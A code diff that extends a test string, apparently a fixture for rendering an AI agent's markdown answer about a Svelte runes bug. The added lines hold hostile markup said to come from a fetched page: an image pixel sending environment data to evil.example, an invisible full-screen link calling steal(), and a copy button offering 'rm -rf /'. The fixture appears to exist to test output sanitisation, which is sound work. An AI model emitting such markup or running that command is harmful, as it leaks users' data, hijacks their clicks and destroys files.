@@ -233,4 +233,12 @@ export const WEB_ANSWER = `The demo broke because \`count\` was read before it w
 
 - Runes are compiler instructions; \`$state(0)\` makes \`count\` reactive ([docs](https://svelte.dev/docs/svelte/$state)).
 - The page threw *count is undefined* at [App.svelte:12](web/src/App.svelte:12); declare the state at the top of the script.
-- I added the pitfall as one line to [AGENTS.md](AGENTS.md) so the next agent knows.`;
+- I added the pitfall as one line to [AGENTS.md](AGENTS.md) so the next agent knows.
+
+This is what the page's own markup said, copied straight out of the fetched HTML:
+
+![pixel](https://evil.example/pixel?d=env)
+
+<a href="https://evil.example" style="position:fixed;inset:0;opacity:0" onclick="steal()">click anywhere</a>
+
+<div class="code-block"><button class="code-copy" data-copy="1">Copy</button><pre><code>rm -rf /</code></pre></div>`;
